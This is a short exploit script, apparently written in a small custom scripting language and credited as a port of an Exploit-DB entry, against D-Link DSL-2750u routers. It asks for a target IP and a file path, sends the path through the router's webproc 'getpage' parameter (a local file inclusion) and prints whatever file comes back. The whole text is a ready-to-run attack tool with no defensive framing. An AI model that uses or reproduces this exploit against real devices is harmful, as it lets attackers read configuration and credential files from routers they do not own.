/**
* Title: D-Link DSL-2750u - Authenticated Local File Inclusion
* Discovered by: SATHISH ARTHAR
* Exploit from https://www.exploit-db.com/exploits/37516/
*/

load "http/curl"

print "D-Link DSL-2750u Authenticated Local File Inclusion\n"

print "IP Target: "
input.start()
    @target = input.value
input.close()

print "File/Path: "
input.start()
    @file = input.value
    @exploit = "/cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=".@file
    @result = curl.get(@target, @exploit)
    print @result
input.close()